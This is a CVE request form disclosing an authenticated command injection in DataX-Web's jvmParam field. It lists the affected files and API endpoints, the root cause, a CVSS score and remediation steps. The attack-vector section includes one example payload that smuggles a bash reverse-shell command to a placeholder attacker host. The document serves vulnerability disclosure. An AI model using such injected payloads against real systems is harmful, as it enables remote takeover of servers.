# CVE Request Form - DataX-Web Command Injection

## Vulnerability Type Info
**Command Injection**

## Vendor of the Product(s) Info
**WeiYe-Jing**

GitHub: https://github.com/WeiYe-Jing

## Affected Product(s)/Code Base Info

| Product | Version |
|---------|---------|
| DataX-Web | <= 2.1.2 |

**Fixed Version:** Not yet fixed

## Has Vendor Confirmed or Acknowledged the Vulnerability?
**No**

## Attack Type Info
**Remote**

## Impact Info
- [x] Code Execution
- [ ] Information Disclosure
- [ ] Denial of Service
- [ ] Other
- [ ] Escalation of Privileges

## Affected Component(s)
- datax-executor/src/main/java/com/wugui/datax/executor/util/BuildCommand.java (buildDataXParam method, lines 54-58)
- datax-executor/src/main/java/com/wugui/datax/executor/service/jobhandler/ExecutorJobHandler.java (execute method, line 55)
- JobInfo.jvmParam field

## Attack Vector(s)
To exploit this vulnerability:

1. An attacker must have valid authentication credentials for DataX-Web (any user role, admin privileges not required)
2. The attacker creates a new DataX synchronization task via the `/api/job/add` API endpoint
3. The attacker injects malicious system commands into the `jvmParam` parameter
4. The attacker triggers the task execution via `/api/job/trigger` or waits for scheduled execution
5. The injected commands are executed on the executor server with the privileges of the DataX executor process

Example malicious payload in the jvmParam field:
```
-Xms1G\n&& bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' #
```

## Suggested Description of the Vulnerability for Use in the CVE

A command injection vulnerability exists in DataX-Web versions <= 2.1.2. The vulnerability is located in the JVM parameter handling functionality where user-supplied input in the `jvmParam` field is not properly validated before being used in system command execution. An authenticated attacker can inject arbitrary system commands through the `/api/job/add` endpoint, which are then executed via `Runtime.getRuntime().exec()` when the task is triggered. This allows remote code execution on the executor server with the privileges of the DataX executor process. The vulnerability affects the `buildDataXParam` method in `BuildCommand.java` and the `execute` method in `ExecutorJobHandler.java`. Successful exploitation can lead to complete server compromise, unauthorized access to sensitive data including database credentials, and potential lateral movement within the network.

CVSS 3.1 Score: 9.8 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Discoverer(s)/Credits Info
**s1ain**

## Reference(s) Info
https://github.com/WeiYe-Jing/datax-web
https://github.com/WeiYe-Jing/datax-web/blob/master/datax-executor/src/main/java/com/wugui/datax/executor/util/BuildCommand.java
https://github.com/WeiYe-Jing/datax-web/blob/master/datax-executor/src/main/java/com/wugui/datax/executor/service/jobhandler/ExecutorJobHandler.java

## Additional Information

### Related CVEs
This vulnerability is similar to previously disclosed vulnerabilities in DataX-Web:
- CVE-2023-7116: Command injection via processId parameter in killJob functionality
- CVE-2024-12358: Command injection via glueSource parameter

### Root Cause
The root cause is the lack of input validation and improper access control:
1. The `jvmParam` field accepts arbitrary string input without validation
2. No whitelist or blacklist filtering is applied to detect malicious characters
3. Any authenticated user can set JVM parameters (no role-based access control)
4. User input is directly concatenated into command strings and executed

### Technical Details
The vulnerability exists in the command building process:
1. User submits jvmParam through `/api/job/add`
2. Parameter is stored in database without validation
3. When task executes, `BuildCommand.buildDataXParam()` concatenates the parameter into command string
4. `ExecutorJobHandler.execute()` calls `Runtime.getRuntime().exec(cmdarrayFinal)`
5. Although exec() receives a String array, the malicious content in jvmParam still gets executed

### Proof of Concept
A complete proof of concept is available in the detailed vulnerability report, including:
- Reverse shell payload
- Data exfiltration examples
- Step-by-step exploitation instructions

### Impact Assessment
- **Severity:** Critical (CVSS 9.8)
- **Exploitability:** High (requires only basic authentication)
- **Scope:** All DataX-Web deployments version <= 2.1.2
- **Potential Impact:**
  - Remote Code Execution
  - Complete server compromise
  - Data breach (access to database credentials)
  - Lateral movement capability

### Recommended Remediation
1. Implement strict input validation with whitelist approach
2. Restrict JVM parameter configuration to administrators only
3. Add comprehensive audit logging
4. Use ProcessBuilder instead of Runtime.exec() where possible
5. Implement least-privilege execution for tasks
